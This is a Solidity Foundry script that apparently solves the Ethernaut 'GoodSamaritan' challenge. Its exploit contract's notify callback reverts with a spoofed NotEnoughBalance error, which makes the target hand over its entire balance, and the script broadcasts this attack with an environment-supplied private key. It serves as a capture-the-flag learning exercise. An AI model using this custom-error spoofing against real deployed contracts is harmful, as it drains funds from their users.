// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/27-GoodSamaritan.sol";  // 引入 GoodSamaritan 合约


contract Exploit {

    error NotEnoughBalance();

    GoodSamaritan public goodsamaritan;

    constructor(address _goodsamaritan) {
        goodsamaritan = GoodSamaritan(_goodsamaritan); 
    }

    function attackk() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
contract Exp is Script {
    GoodSamaritan public GoodSamaritanInstance = GoodSamaritan(payable(0x9dce21C252561dF2452F2f703fe604e525c5929F));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function attack() public {
        Exploit badSamaritan = new Exploit(address(GoodSamaritanInstance)); // 通过构造函数传入实例地址
        badSamaritan.attackk();
    }

    function run() external {
        vm.startBroadcast(hacker);

        attack();

        vm.stopBroadcast();
    }
}

